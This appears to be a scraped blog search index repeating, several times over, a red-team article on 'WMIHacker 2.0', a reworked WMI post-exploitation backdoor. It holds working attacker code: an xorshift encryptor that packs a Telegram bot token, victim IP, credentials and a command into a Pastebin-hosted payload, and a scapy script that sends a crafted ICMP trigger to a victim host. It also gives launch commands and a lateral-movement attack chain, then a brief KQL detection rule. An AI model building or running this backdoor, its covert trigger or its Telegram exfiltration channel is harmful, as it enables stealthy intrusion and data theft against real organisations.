asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) Generate encrypted payload which will be placed in Pastebin.com\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) Send maliciously crafted ICMP ECHO request to host\nVICTIM HOST:\npython wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; The attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes lateral commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Assymetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Assymetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) Generate encrypted payload which will be placed in Pastebin.com\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) Send maliciously crafted ICMP ECHO request to host\nVICTIM HOST:\nPS\u0026gt; python wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; The attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes lateral commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Assymetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Assymetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) Generate encrypted payload which will be placed in Pastebin.com\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) Send maliciously crafted ICMP ECHO request to host\nOn VICTIM HOST:\nPS\u0026gt; python wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; The attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes lateral commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Assymetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Assymetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) Generate encrypted payload which will be placed in Pastebin.com\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) Send maliciously crafted ICMP ECHO request to host\nOn victims HOST:\nPS\u0026gt; python wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; The attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes lateral commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Assymetric approach in C2 